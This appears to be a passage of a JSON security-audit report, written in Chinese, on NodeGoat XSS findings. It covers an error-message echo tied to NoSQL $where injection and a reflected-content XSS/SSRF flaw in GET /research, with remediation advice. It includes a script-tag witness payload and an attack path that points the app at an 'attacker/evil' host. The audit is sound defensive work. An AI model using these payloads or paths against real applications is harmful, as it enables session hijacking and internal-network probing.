+      "remediation": "在 app/routes/error.js:10-12 渲染前对 err.message 做 HTML 编码并仅输出白名单化的 message（不输出 stack/对象全文）；修复 allocations-dao.js:77-79 的 $where 字符串插值（改用参数化查询并移除 $where）。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 8.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "$where NoSQL 注入本身由注入分析覆盖；此处关注其错误消息回显形成的 XSS。V8 eval SyntaxError（POST /contributions）消息通常不含完整表达式文本，触发可靠性低，列为弱触发。全局错误中间件注册于 index.js:82（app.use(ErrorHandler)），覆盖所有路由。"
+    },
+    {
+      "ID": "XSS-VULN-11",
+      "title": "反射内容 XSS：GET /research 将攻击者控制的远端响应原样回显为 text/html（research.js:18-27）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "high",
+      "source": "url (query) / symbol (query, GET /research)",
+      "source_detail": "displayResearch 拼接 req.query.url + req.query.symbol（research.js:15）并 needle.get(url)（research.js:16，无 scheme/host 校验）；远端响应体经 res.write(body) 原样写回客户端（research.js:22-27），并显式设置 Content-Type: text/html（research.js:18-20）",
+      "path": "GET /research?url=http://attacker/evil&symbol=x → displayResearch (app/routes/research.js:12-30) → needle.get(攻击者可控完整 URL) (research.js:16) → 远端 HTML 响应体 → res.writeHead(200, {\"Content-Type\":\"text/html\"}) + res.write(body) (research.js:18-27) → 浏览器以 NodeGoat 源（含受害者会话 cookie）渲染执行",
+      "sink_function": "res.write(body) at app/routes/research.js:25（远端响应体原样写入 text/html 响应）",
+      "render_context": "HTML_BODY",
+      "encoding_observed": "None — 无 scheme/host 白名单、无 X-Content-Type-Options: nosniff、无 Content-Disposition；响应体零净化。",
+      "mismatch_reason": "攻击者完全控制 needle.get 的目标 URL 与返回内容，服务器把远端 HTML 以 text/html、NodeGoat 源、受害会话上下文中原样回显，等价于把攻击者站点内容\"挂\"到应用域名下执行。",
+      "witness_payload": "<script>alert(document.domain)</script>",
+      "authentication_required": "true",
+      "accessible_routes": "GET /research [isLoggedIn] (trigger)",
+      "endpoints": [
+        "GET /research (trigger)"
+      ],
+      "affected_parameters": [
+        "url (query)",
+        "symbol (query)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "拼接 req.query.url + req.query.symbol 为完整 URL",
+          "file": "app/routes/research.js",
+          "line": 15,
+          "protection": null
+        },
+        {
+          "label": "needle.get 请求任意目标（SSRF，无校验）",
+          "file": "app/routes/research.js",
+          "line": 16,
+          "protection": null
+        },
+        {
+          "label": "远端响应体原样写回 text/html 响应",
+          "file": "app/routes/research.js",
+          "line": 25,
+          "protection": null
+        },
+        {
+          "label": "浏览器以 NodeGoat 源渲染并执行远端脚本",
+          "file": null,
+          "line": null,
+          "protection": null
+        }
+      ],
+      "impact": "攻击者托管含恶意脚本的页面并诱使登录受害者访问 /research?url=攻击者URL，脚本即在 NodeGoat 源、受害会话上下文中执行，可实现会话内任意操作与数据窃取，同时兼具 SSRF 内网读取能力。",
+      "remediation": "在 app/routes/research.js:15-16 对 url 做 scheme（仅 https）+ 域名（仅 finance.yahoo.com）白名单校验，并对回显内容设置 Content-Disposition: attachment 或 X-Content-Type-Options: nosniff + 输出 HTML 编码。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N 7.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "SSRF 属性本身（内网探测）由 SSRF 分析覆盖；此处聚焦\"攻击者内容以应用源执行\"的反射内容 XSS 面。无 CSP 无 nosniff 放大了该向量。needle 默认 follow:false 不影响直接取回。"
+    }
+  ]
+}
